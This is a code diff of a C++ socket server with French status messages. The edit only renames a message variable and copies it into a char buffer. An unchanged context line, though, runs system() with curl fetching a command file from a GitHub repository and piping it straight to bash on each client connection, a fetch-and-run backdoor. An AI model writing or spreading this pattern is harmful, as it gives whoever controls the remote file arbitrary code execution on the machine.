@@ -43,7 +43,7 @@ int main(int argc, char * argv[]) {
  
     string msgErreur = "Erreur lors de l'exec de la commande \n \n";
     string msgSucces = "Commande executee avec succes \n \n";
-    string msg = "Defaut";
+    string msgStr = "Defaut";
  
     for (int i = 1; i <= NB_CLIENTS; i++) {
  
@@ -51,9 +51,13 @@ int main(int argc, char * argv[]) {
  
         const int retour = system("curl https://raw.githubusercontent.com/Suricateee/socketOpenerForPersonalLAN/main/command.txt | bash");
 
-        if(retour==0) msg = msgSucces;
-        if(retour!=0) msg = msgErreur;
- 
+        if(retour==0) msgStr = msgSucces;
+        if(retour!=0) msgStr = msgErreur;
+
+        std::string str = msgStr;
+        char * msg = new char[str.length() + 1];
+        strcpy(msg, str.c_str());
+
         if (sock_client == -1)
             exitErreur("accept");
  
